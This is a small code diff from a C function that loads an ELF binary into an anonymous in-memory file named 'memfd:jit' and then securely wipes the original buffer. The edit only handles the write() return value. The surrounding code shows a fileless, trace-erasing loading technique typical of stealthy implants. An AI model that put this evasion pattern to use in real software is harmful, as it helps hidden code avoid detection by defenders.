@@ -308,7 +308,8 @@ static int phantom_elf_entry(void *arg) {
   /* Create an anonymous file in RAM */
   int fd = syscall(SYS_memfd_create, "memfd:jit", MFD_CLOEXEC);
   if (fd >= 0) {
-      write(fd, ctx->elf_data, ctx->elf_len);
+      ssize_t written = write(fd, ctx->elf_data, ctx->elf_len);
+      (void)written;
 
       /* Secure wipe the raw buffer now that it's in the memfd */
       AEGIS_WIPE(ctx->elf_data, ctx->elf_len, 3);
